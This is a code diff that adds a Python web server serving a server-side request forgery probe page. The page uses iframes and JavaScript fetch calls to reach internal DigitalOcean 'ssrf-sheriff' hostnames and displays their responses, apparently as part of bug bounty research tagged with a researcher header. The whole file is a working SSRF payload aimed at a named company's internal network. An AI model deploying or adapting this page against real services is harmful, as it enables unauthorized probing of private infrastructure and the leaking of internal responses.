@@ -1,0 +1,50 @@
+import http.server
+import socketserver
+
+HTML = """<!DOCTYPE html>
+<html>
+<head><title>SSRF Sheriff Results</title></head>
+<body>
+<h1>SSRF Sheriff Probe Page</h1>
+<p>This page contains iframes that load internal DigitalOcean endpoints.</p>
+<h2>Sheriff endpoints:</h2>
+<iframe src="https://ssrf-sheriff.internal.digitalocean.com/" width="100%%" height="300"></iframe>
+<br>
+<iframe src="https://ssrf-sheriff.s2r1.internal.digitalocean.com/" width="100%%" height="300"></iframe>
+<br>
+<iframe src="https://ssrf-sheriff.internal.digitalocean.com/?researcher=oxship" width="100%%" height="300"></iframe>
+<br>
+<iframe src="https://ssrf-sheriff.s2r1.internal.digitalocean.com/?researcher=oxship" width="100%%" height="300"></iframe>
+<h2>JS Fetch Results:</h2>
+<pre id="r">Loading...</pre>
+<script>
+(async function(){
+    var out = "";
+    var urls = [
+        "https://ssrf-sheriff.internal.digitalocean.com/",
+        "https://ssrf-sheriff.s2r1.internal.digitalocean.com/"
+    ];
+    for (var u of urls) {
+        try {
+            var r = await fetch(u, {headers:{"X-BBP-Researcher":"oxship"}});
+            out += u + ": " + await r.text() + "\\n";
+        } catch(e) {
+            out += u + ": ERR " + e + "\\n";
+        }
+    }
+    document.getElementById("r").textContent = out;
+})();
+</script>
+</body>
+</html>"""
+
+class Handler(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header("Content-Type", "text/html")
+        self.end_headers()
+        self.wfile.write(HTML.encode())
+
+with socketserver.TCPServer(("0.0.0.0", 8080), Handler) as s:
+    print("Serving on 8080", flush=True)
+    s.serve_forever()
